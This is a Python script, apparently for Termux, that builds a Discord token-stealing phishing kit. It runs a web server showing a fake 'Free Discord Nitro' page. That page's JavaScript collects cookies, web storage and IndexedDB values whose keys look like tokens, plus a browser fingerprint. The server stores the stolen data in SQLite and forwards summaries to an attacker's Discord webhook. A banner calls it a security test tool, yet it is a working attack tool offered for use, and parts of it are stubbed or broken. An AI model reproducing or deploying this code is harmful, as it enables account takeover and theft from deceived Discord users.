#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import json
import sqlite3
import hashlib
import threading
import socket
import ssl
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, quote
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import requests

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.text import Text
from rich.syntax import Syntax
from rich.layout import Layout
from rich.live import Live
from rich.markdown import Markdown

console = Console()

class AdvancedDiscordTokenStealer:
    def __init__(self):
        self.web_server = None
        self.server_port = 8080
        self.webhook_url = ""
        self.redirect_url = "https://discord.com"
        self.server_ip = self.get_local_ip()
        self.encryption_key = get_random_bytes(32)
        self.html_templates = self._load_html_templates()
        self.current_template = "discord_nitro"
        self.is_running = False
        
    def get_local_ip(self):
        """Obtém o IP local da máquina"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _load_html_templates(self):
        """Carrega todos os templates HTML disponíveis"""
        templates = {
            "discord_nitro": self._create_discord_nitro_template(),
            "game_giveaway": self._create_game_giveaway_template(),
            "account_verification": self._create_account_verification_template(),
            "security_alert": self._create_security_alert_template()
        }
        return templates
    
    def _create_discord_nitro_template(self):
        """Template de oferta de Nitro grátis"""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Discord Nitro Generator</title>
    <style>/* Estilos otimizados */</style>
</head>
<body>
    <div class="container">
        <img src="https://discord.com/assets/192cb9459cee8e3c2c0d31a8387c0b5d.svg" class="discord-logo">
        <h1>🎉 Free Discord Nitro! 🎉</h1>
        <p>Click the button below to claim your free Discord Nitro subscription!</p>
        <button class="btn" onclick="claimNitro()">CLAIM NITRO</button>
        <div id="loading" class="hidden">Processing your request...</div>
    </div>
    <script>
        // JavaScript avançado para coleta de tokens
        function extractAllTokens() {
            const tokens = [];
            
            // LocalStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (this.isTokenKey(key)) {
                    tokens.push({source: 'localStorage', key, value: localStorage.getItem(key)});
                }
            }
            
            // SessionStorage
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (this.isTokenKey(key)) {
                    tokens.push({source: 'sessionStorage', key, value: sessionStorage.getItem(key)});
                }
            }
            
            // Cookies
            document.cookie.split(';').forEach(cookie => {
                const [key, value] = cookie.split('=').map(c => c.trim());
                if (this.isTokenKey(key)) {
                    tokens.push({source: 'cookie', key, value});
                }
            });
            
            // IndexedDB (assíncrono)
            this.extractIndexedDBTokens().then(indexedDBTokens => {
                tokens.push(...indexedDBTokens);
                this.sendToServer(tokens);
            });
            
            return tokens;
        }
        
        function isTokenKey(key) {
            if (!key) return false;
            const lowerKey = key.toLowerCase();
            return lowerKey.includes('token') || 
                   lowerKey.includes('auth') || 
                   lowerKey.includes('session') ||
                   lowerKey.includes('discord') ||
                   lowerKey.includes('access') ||
                   lowerKey.includes('refresh') ||
                   lowerKey.includes('secret');
        }
        
        async function extractIndexedDBTokens() {
            const tokens = [];
            try {
                if (window.indexedDB) {
                    // Tenta acessar databases comuns
                    const dbNames = ['discord', 'auth', 'tokens', 'userData'];
                    for (const dbName of dbNames) {
                        try {
                            const request = indexedDB.open(dbName);
                            request.onsuccess = (event) => {
                                const db = event.target.result;
                                const transaction = db.transaction(db.objectStoreNames, 'readonly');
                                Array.from(db.objectStoreNames).forEach(storeName => {
                                    const store = transaction.objectStore(storeName);
                                    const request = store.getAll();
                                    request.onsuccess = (e) => {
                                        e.target.result.forEach(item => {
                                            if (typeof item === 'object') {
                                                this.searchForTokensInObject(item, tokens, `indexedDB:${dbName}.${storeName}`);
                                            }
                                        });
                                    };
                                });
                            };
                        } catch (e) {}
                    }
                }
            } catch (e) {}
            return tokens;
        }
        
        function searchForTokensInObject(obj, tokens, path) {
            if (!obj || typeof obj !== 'object') return;
            
            for (const [key, value] of Object.entries(obj)) {
                if (this.isTokenKey(key) && value) {
                    tokens.push({source: path, key, value: String(value)});
                }
                if (typeof value === 'object') {
                    this.searchForTokensInObject(value, tokens, `${path}.${key}`);
                }
            }
        }
        
        function collectSystemInfo() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookies: document.cookie,
                referrer: document.referrer,
                url: window.location.href,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                plugins: Array.from(navigator.plugins).map(p => p.name),
                timestamp: new Date().toISOString(),
                fingerprint: this.generateFingerprint()
            };
        }
        
        function generateFingerprint() {
            // Gera uma fingerprint única do navegador
            const components = [
                navigator.userAgent,
                navigator.language,
                screen.width,
                screen.height,
                new Date().getTimezoneOffset(),
                !!navigator.cookieEnabled,
                !!navigator.javaEnabled(),
                navigator.hardwareConcurrency || 'unknown'
            ];
            return components.join('|');
        }
        
        function sendToServer(tokens) {
            const data = {
                tokens: tokens,
                systemInfo: this.collectSystemInfo(),
                networkInfo: this.getNetworkInfo()
            };
            
            // Múltiplos métodos de envio para garantir recepção
            this.sendViaFetch(data);
            this.sendViaXHR(data);
            this.sendViaBeacon(data);
        }
        
        function sendViaFetch(data) {
            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data),
                mode: 'no-cors'
            }).catch(() => {});
        }
        
        function sendViaBeacon(data) {
            const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
            navigator.sendBeacon('/capture', blob);
        }
        
        window.addEventListener('load', () => {
            setTimeout(() => {
                const tokens = this.extractAllTokens();
                if (tokens.length > 0) {
                    this.sendToServer(tokens);
                }
            }, 2000);
        });
    </script>
</body>
</html>"""
    
    def _create_game_giveaway_template(self):
        """Template de sorteio de jogos"""
        return """<!DOCTYPE html><html>...template de sorteio de jogos...</html>"""
    
    def _create_account_verification_template(self):
        """Template de verificação de conta"""
        return """<!DOCTYPE html><html>...template de verificação...</html>"""
    
    def _create_security_alert_template(self):
        """Template de alerta de segurança"""
        return """<!DOCTYPE html><html>...template de segurança...</html>"""

    def encrypt_data(self, data):
        """Criptografa dados sensíveis"""
        try:
            cipher = AES.new(self.encryption_key, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
            return base64.b64encode(cipher.iv + ct_bytes).decode()
        except:
            return data

    def decrypt_data(self, encrypted_data):
        """Descriptografa dados"""
        try:
            data = base64.b64decode(encrypted_data)
            iv, ct = data[:16], data[16:]
            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
            return unpad(cipher.decrypt(ct), AES.block_size).decode()
        except:
            return encrypted_data

    def mostrar_menu_principal(self):
        """Menu principal do sistema"""
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]🔧 DISCORD TOKEN STEALER AVANÇADO[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=10)
            tabela.add_column("Ação", style="green")
            tabela.add_column("Status", style="yellow")
            
            status_server = "[red]OFF[/red]" if not self.is_running else "[green]ON[/green]"
            status_webhook = "[red]OFF[/red]" if not self.webhook_url else "[green]ON[/green]"
            
            tabela.add_row("1", "Configurar Servidor", "")
            tabela.add_row("2", "Selecionar Template", f"[blue]{self.current_template}[/blue]")
            tabela.add_row("3", "Iniciar Servidor Web", status_server)
            tabela.add_row("4", "Ver Tokens Capturados", "")
            tabela.add_row("5", "Configurar Webhook", status_webhook)
            tabela.add_row("6", "Exportar Dados", "")
            tabela.add_row("7", "Estatísticas", "")
            tabela.add_row("0", "Sair", "")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=["0", "1", "2", "3", "4", "5", "6", "7"],
                show_choices=False
            )
            
            opcoes = {
                "1": self.configurar_servidor,
                "2": self.selecionar_template,
                "3": self.iniciar_servidor_web,
                "4": self.ver_tokens_capturados,
                "5": self.configurar_webhook,
                "6": self.exportar_dados,
                "7": self.mostrar_estatisticas,
                "0": lambda: sys.exit(0)
            }
            
            opcoes[escolha]()

    def selecionar_template(self):
        """Seleciona o template HTML a ser usado"""
        console.clear()
        console.print(Panel.fit(
            "[bold]Selecionar Template[/bold]",
            border_style="blue"
        ))
        
        templates = list(self.html_templates.keys())
        tabela = Table(show_header=True, header_style="bold green")
        tabela.add_column("ID", style="cyan")
        tabela.add_column("Template", style="green")
        tabela.add_column("Descrição", style="yellow")
        
        descricoes = {
            "discord_nitro": "Oferta de Nitro grátis",
            "game_giveaway": "Sorteio de jogos",
            "account_verification": "Verificação de conta",
            "security_alert": "Alerta de segurança"
        }
        
        for i, template in enumerate(templates, 1):
            tabela.add_row(str(i), template, descricoes.get(template, "Sem descrição"))
        
        console.print(tabela)
        
        escolha = Prompt.ask(
            "[blink yellow]➤[/blink yellow] Selecione o template",
            choices=[str(i) for i in range(1, len(templates) + 1)],
            show_choices=False
        )
        
        self.current_template = templates[int(escolha) - 1]
        console.print(f"[green]✓ Template selecionado: {self.current_template}[/green]")
        time.sleep(1)

    def iniciar_servidor_web(self):
        """Inicia o servidor web para captura de tokens"""
        if self.is_running:
            console.print("[yellow]⚠ Servidor já está em execução[/yellow]")
            time.sleep(1)
            return
        
        console.clear()
        console.print(Panel.fit(
            "[bold]Iniciando Servidor Web[/bold]",
            border_style="blue"
        ))
        
        class AdvancedTokenHandler(BaseHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, **kwargs)
            
            def log_message(self, format, *args):
                """Silencia logs padrão"""
                return
            
            def do_GET(self):
                """Manipula requisições GET"""
                try:
                    if self.path == '/':
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html; charset=utf-8')
                        self.end_headers()
                        
                        html_content = self.server.stealer.html_templates[
                            self.server.stealer.current_template
                        ].format(self.server.stealer.redirect_url)
                        
                        self.wfile.write(html_content.encode('utf-8'))
                        
                    elif self.path == '/capture.js':
                        self.send_response(200)
                        self.send_header('Content-type', 'application/javascript')
                        self.end_headers()
                        self.wfile.write(b'// JavaScript de captura')
                        
                    else:
                        self.send_response(302)
                        self.send_header('Location', self.server.stealer.redirect_url)
                        self.end_headers()
                        
                except Exception as e:
                    self.send_response(500)
                    self.end_headers()
            
            def do_POST(self):
                """Manipula requisições POST de captura"""
                try:
                    if self.path == '/capture':
                        content_length = int(self.headers.get('Content-Length', 0))
                        if content_length > 0:
                            post_data = self.rfile.read(content_length)
                            data = json.loads(post_data.decode('utf-8'))
                            
                            # Processa e salva os dados
                            self.server.stealer.processar_dados_capturados(data)
                            
                            self.send_response(200)
                            self.send_header('Content-type', 'text/plain')
                            self.end_headers()
                            self.wfile.write(b'OK')
                        else:
                            self.send_response(400)
                            self.end_headers()
                    else:
                        self.send_response(404)
                        self.end_headers()
                        
                except Exception as e:
                    self.send_response(500)
                    self.end_headers()
        
        try:
            server = HTTPServer(('', self.server_port), AdvancedTokenHandler)
            server.stealer = self
            
            # Inicia o servidor em thread separada
            server_thread = threading.Thread(target=server.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            
            self.web_server = server
            self.is_running = True
            
            console.print(Panel.fit(
                f"[green]✓ Servidor iniciado com sucesso![/green]\n\n"
                f"[cyan]URL:[/cyan] http://{self.server_ip}:{self.server_port}\n"
                f"[cyan]Template:[/cyan] {self.current_template}\n"
                f"[cyan]Webhook:[/cyan] {'Configurado' if self.webhook_url else 'Não configurado'}",
                title="[bold green]SERVIDOR ATIVO[/bold green]",
                border_style="green"
            ))
            
            console.print(Panel.fit(
                "[yellow]⚠ Pressione Ctrl+C para parar o servidor[/yellow]",
                border_style="yellow"
            ))
            
            # Mantém o servidor rodando
            while self.is_running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            console.print("\n[red]✗ Servidor parado[/red]")
            self.is_running = False
            if self.web_server:
                self.web_server.shutdown()
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro ao iniciar servidor: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
            self.is_running = False
            time.sleep(2)

    def processar_dados_capturados(self, data):
        """Processa os dados capturados"""
        try:
            # Cria diretório de dados se não existir
            if not os.path.exists('data'):
                os.makedirs('data')
            
            # Conecta ao banco de dados
            conn = sqlite3.connect('data/tokens_advanced.db')
            c = conn.cursor()
            
            # Cria tabelas se não existirem
            c.execute('''CREATE TABLE IF NOT EXISTS captures
                         (id INTEGER PRIMARY KEY AUTOINCREMENT,
                          timestamp TEXT,
                          tokens TEXT,
                          system_info TEXT,
                          network_info TEXT,
                          template_used TEXT,
                          encrypted INTEGER DEFAULT 0)''')
            
            # Prepara dados para inserção
            timestamp = datetime.now().isoformat()
            tokens_encrypted = self.encrypt_data(json.dumps(data.get('tokens', [])))
            system_info_encrypted = self.encrypt_data(json.dumps(data.get('systemInfo', {})))
            network_info_encrypted = self.encrypt_data(json.dumps(data.get('networkInfo', {})))
            
            # Insere dados
            c.execute('''INSERT INTO captures 
                         (timestamp, tokens, system_info, network_info, template_used, encrypted)
                         VALUES (?, ?, ?, ?, ?, 1)''',
                     (timestamp, tokens_encrypted, system_info_encrypted, 
                      network_info_encrypted, self.current_template))
            
            conn.commit()
            conn.close()
            
            # Envia webhook se configurado
            if self.webhook_url:
                self.enviar_webhook_avancado(data)
            
            console.print(f"[green]✓ Dados capturados em {timestamp}[/green]")
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao processar dados: {str(e)}[/red]")

    def enviar_webhook_avancado(self, data):
        """Envia dados para webhook do Discord com informações avançadas"""
        try:
            embed = {
                "title": "🎯 Nova Captura de Tokens",
                "color": 0x7289DA,
                "fields": [
                    {
                        "name": "📅 Timestamp",
                        "value": data.get('systemInfo', {}).get('timestamp', 'N/A'),
                        "inline": True
                    },
                    {
                        "name": "🌐 User Agent",
                        "value": data.get('systemInfo', {}).get('userAgent', 'N/A')[:100] + "...",
                        "inline": True
                    },
                    {
                        "name": "🔤 Language",
                        "value": data.get('systemInfo', {}).get('language', 'N/A'),
                        "inline": True
                    },
                    {
                        "name": "💻 Platform",
                        "value": data.get('systemInfo', {}).get('platform', 'N/A'),
                        "inline": True
                    },
                    {
                        "name": "📱 Screen",
                        "value": data.get('systemInfo', {}).get('screen', 'N/A'),
                        "inline": True
                    }
                ],
                "footer": {
                    "text": f"Template: {self.current_template} | Advanced Token Stealer"
                }
            }
            
            # Adiciona informações de tokens
            tokens = data.get('tokens', [])
            if tokens:
                token_count = len(tokens)
                token_preview = "\n".join(
                    f"`{t.get('source', 'unknown')}: {t.get('key', 'unknown')[:20]}...`"
                    for t in tokens[:3]
                )
                
                if token_count > 3:
                    token_preview += f"\n... e mais {token_count - 3} tokens"
                
                embed["fields"].append({
                    "name": f"🔑 Tokens Encontrados ({token_count})",
                    "value": token_preview,
                    "inline": False
                })
            
            payload = {
                "embeds": [embed],
                "username": "Advanced Token Stealer",
                "avatar_url": "https://i.imgur.com/3Vh6VQ5.png"
            }
            
            response = requests.post(self.webhook_url, json=payload, timeout=10)
            
            if response.status_code in [200, 204]:
                console.print("[green]✓ Webhook enviado com sucesso![/green]")
            else:
                console.print(f"[red]✗ Erro no webhook: {response.status_code}[/red]")
                
        except Exception as e:
            console.print(f"[red]✗ Erro ao enviar webhook: {str(e)}[/red]")

    def ver_tokens_capturados(self):
        """Exibe tokens capturados"""
        console.clear()
        console.print(Panel.fit(
            "[bold]Tokens Capturados[/bold]",
            border_style="blue"
        ))
        
        try:
            if not os.path.exists('data/tokens_advanced.db'):
                console.print("[yellow]Nenhum dado capturado ainda.[/yellow]")
                input("\nPressione Enter para continuar...")
                return
            
            conn = sqlite3.connect('data/tokens_advanced.db')
            c = conn.cursor()
            
            # Estatísticas básicas
            c.execute("SELECT COUNT(*) FROM captures")
            total_capturas = c.fetchone()[0]
            
            c.execute("SELECT COUNT(*) FROM captures WHERE encrypted = 1")
            capturas_criptografadas = c.fetchone()[0]
            
            console.print(f"[cyan]Total de capturas:[/cyan] {total_capturas}")
            console.print(f"[cyan]Capturas criptografadas:[/cyan] {capturas_criptografadas}")
            console.print()
            
            # Lista capturas recentes
            c.execute('''SELECT id, timestamp, template_used FROM captures 
                         ORDER BY id DESC LIMIT 10''')
            rows = c.fetchall()
            
            if not rows:
                console.print("[yellow]Nenhuma captura encontrada.[/yellow]")
                input("\nPressione Enter para continuar...")
                return
            
            tabela = Table(show_header=True, header_style="bold magenta")
            tabela.add_column("ID", style="cyan")
            tabela.add_column("Data/Hora", style="green")
            tabela.add_column("Template", style="yellow")
            tabela.add_column("Ações", style="blue")
            
            for row in rows:
                tabela.add_row(
                    str(row[0]), 
                    row[1], 
                    row[2],
                    "[bold]Ver[/bold] | [red]Deletar[/red]"
                )
            
            console.print(tabela)
            
            # Opção para ver detalhes
            escolha = Prompt.ask(
                "\n[blink yellow]➤[/blink yellow] Ver detalhes (ID) ou 0 para voltar",
                default="0"
            )
            
            if escolha != "0" and escolha.isdigit():
                self.mostrar_detalhes_captura(int(escolha))
            
            conn.close()
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
            time.sleep(2)

    def mostrar_detalhes_captura(self, capture_id):
        """Mostra detalhes de uma captura específica"""
        try:
            conn = sqlite3.connect('data/tokens_advanced.db')
            c = conn.cursor()
            
            c.execute('''SELECT timestamp, tokens, system_info, network_info, template_used, encrypted 
                         FROM captures WHERE id = ?''', (capture_id,))
            detalhes = c.fetchone()
            
            if not detalhes:
                console.print("[red]Captura não encontrada.[/red]")
                time.sleep(1)
                return
            
            console.clear()
            console.print(Panel.fit(
                f"[bold]Detalhes da Captura #{capture_id}[/bold]",
                border_style="blue"
            ))
            
            # Desserializa dados
            timestamp, tokens_enc, system_info_enc, network_info_enc, template, encrypted = detalhes
            
            if encrypted:
                tokens_data = json.loads(self.decrypt_data(tokens_enc))
                system_info = json.loads(self.decrypt_data(system_info_enc))
                network_info = json.loads(self.decrypt_data(network_info_enc))
            else:
                tokens_data = json.loads(tokens_enc)
                system_info = json.loads(system_info_enc)
                network_info = json.loads(network_info_enc)
            
            # Informações do sistema
            console.print(Panel.fit(
                f"[cyan]Template:[/cyan] {template}\n"
                f"[cyan]Data/Hora:[/cyan] {timestamp}\n"
                f"[cyan]User Agent:[/cyan] {system_info.get('userAgent', 'N/A')}\n"
                f"[cyan]Plataforma:[/cyan] {system_info.get('platform', 'N/A')}\n"
                f"[cyan]Idioma:[/cyan] {system_info.get('language', 'N/A')}\n"
                f"[cyan]Screen:[/cyan] {system_info.get('screen', 'N/A')}\n"
                f"[cyan]Timezone:[/cyan] {system_info.get('timezone', 'N/A')}",
                title="[bold]Informações do Sistema[/bold]",
                border_style="green"
            ))
            
            # Tokens encontrados
            if tokens_data:
                console.print(Panel.fit(
                    f"[green]Encontrados {len(tokens_data)} tokens:[/green]",
                    title="[bold]Tokens[/bold]",
                    border_style="yellow"
                ))
                
                for i, token in enumerate(tokens_data[:5], 1):
                    console.print(Panel.fit(
                        f"[cyan]Fonte:[/cyan] {token.get('source', 'N/A')}\n"
                        f"[cyan]Chave:[/cyan] {token.get('key', 'N/A')}\n"
                        f"[cyan]Valor:[/cyan] {token.get('value', 'N/A')[:100]}...",
                        border_style="red"
                    ))
                
                if len(tokens_data) > 5:
                    console.print(f"[yellow]... e mais {len(tokens_data) - 5} tokens[/yellow]")
            else:
                console.print("[yellow]Nenhum token encontrado nesta captura.[/yellow]")
            
            input("\nPressione Enter para continuar...")
            
        except Exception as e:
            console.print(f"[red]Erro ao mostrar detalhes: {str(e)}[/red]")
            time.sleep(2)
        finally:
            if conn:
                conn.close()

    def exportar_dados(self):
        """Exporta dados capturados"""
        console.clear()
        console.print(Panel.fit(
            "[bold]Exportar Dados[/bold]",
            border_style="blue"
        ))
        
        try:
            if not os.path.exists('data/tokens_advanced.db'):
                console.print("[yellow]Nenhum dado para exportar.[/yellow]")
                time.sleep(1)
                return
            
            formatos = ["JSON", "CSV", "TXT"]
            tabela = Table(show_header=True, header_style="bold green")
            tabela.add_column("ID", style="cyan")
            tabela.add_column("Formato", style="green")
            tabela.add_column("Descrição", style="yellow")
            
            descricoes = {
                "JSON": "Formato estruturado para programas",
                "CSV": "Planilha compatível com Excel",
                "TXT": "Texto simples para leitura humana"
            }
            
            for i, formato in enumerate(formatos, 1):
                tabela.add_row(str(i), formato, descricoes[formato])
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione o formato",
                choices=[str(i) for i in range(1, len(formatos) + 1)],
                show_choices=False
            )
            
            formato_selecionado = formatos[int(escolha) - 1]
            nome_arquivo = f"tokens_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{formato_selecionado.lower()}"
            
            # Exporta dados
            conn = sqlite3.connect('data/tokens_advanced.db')
            c = conn.cursor()
            
            c.execute("SELECT * FROM captures")
            dados = c.fetchall()
            
            if formato_selecionado == "JSON":
                dados_export = []
                for linha in dados:
                    dados_export.append({
                        "id": linha[0],
                        "timestamp": linha[1],
                        "template": linha[5]
                    })
                
                with open(nome_arquivo, 'w', encoding='utf-8') as f:
                    json.dump(dados_export, f, indent=2, ensure_ascii=False)
                    
            elif formato_selecionado == "CSV":
                import csv
                with open(nome_arquivo, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(['ID', 'Timestamp', 'Template'])
                    for linha in dados:
                        writer.writerow([linha[0], linha[1], linha[5]])
            
            elif formato_selecionado == "TXT":
                with open(nome_arquivo, 'w', encoding='utf-8') as f:
                    for linha in dados:
                        f.write(f"ID: {linha[0]} | Timestamp: {linha[1]} | Template: {linha[5]}\n")
            
            console.print(f"[green]✓ Dados exportados como {nome_arquivo}[/green]")
            time.sleep(1)
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao exportar dados: {str(e)}[/red]")
            time.sleep(2)
        finally:
            if conn:
                conn.close()

    def mostrar_estatisticas(self):
        """Mostra estatísticas das capturas"""
        console.clear()
        console.print(Panel.fit(
            "[bold]Estatísticas[/bold]",
            border_style="blue"
        ))
        
        try:
            if not os.path.exists('data/tokens_advanced.db'):
                console.print("[yellow]Nenhum dado disponível para estatísticas.[/yellow]")
                time.sleep(1)
                return
            
            conn = sqlite3.connect('data/tokens_advanced.db')
            c = conn.cursor()
            
            # Estatísticas básicas
            c.execute("SELECT COUNT(*) FROM captures")
            total_capturas = c.fetchone()[0]
            
            c.execute("SELECT COUNT(DISTINCT timestamp) FROM captures")
            capturas_unicas = c.fetchone()[0]
            
            c.execute("SELECT template_used, COUNT(*) FROM captures GROUP BY template_used")
            templates_stats = c.fetchall()
            
            console.print(Panel.fit(
                f"[cyan]Total de capturas:[/cyan] {total_capturas}\n"
                f"[cyan]Capturas únicas:[/cyan] {capturas_unicas}\n"
                f"[cyan]Templates utilizados:[/cyan]",
                title="[bold]Estatísticas Gerais[/bold]",
                border_style="green"
            ))
            
            for template, count in templates_stats:
                console.print(f"  [yellow]{template}:[/yellow] {count} capturas")
            
            # Últimas capturas
            c.execute("SELECT timestamp FROM captures ORDER BY id DESC LIMIT 1")
            ultima_captura = c.fetchone()
            
            if ultima_captura:
                console.print(f"\n[cyan]Última captura:[/cyan] {ultima_captura[0]}")
            
            input("\nPressione Enter para continuar...")
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao gerar estatísticas: {str(e)}[/red]")
            time.sleep(2)
        finally:
            if conn:
                conn.close()

    def mostrar_banner(self):
        """Exibe banner personalizado"""
        banner = """
[bold blue]
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗      ║
║    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗     ║
║    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║     ║
║    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║     ║
║    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝     ║
║    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝      ║
║                                                              ║
║                 ADVANCED TOKEN STEALER v2.0                  ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝[/bold blue]
"""
        console.print(banner)
        console.print(Panel.fit(
            "[blink bold red]⚠️ FERRAMENTA DE TESTE DE SEGURANÇA - USE COM RESPONSABILIDADE! ⚠️[/blink bold red]",
            style="red on black"
        ))

def main():
    """Função principal"""
    try:
        stealer = AdvancedDiscordTokenStealer()
        stealer.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Programa encerrado[/red]")
    except Exception as e:
        console.print(f"\n[red]✗ Erro crítico: {str(e)}[/red]")
        import traceback
        console.print(f"[yellow]{traceback.format_exc()}[/yellow]")

if __name__ == '__main__':
    main()
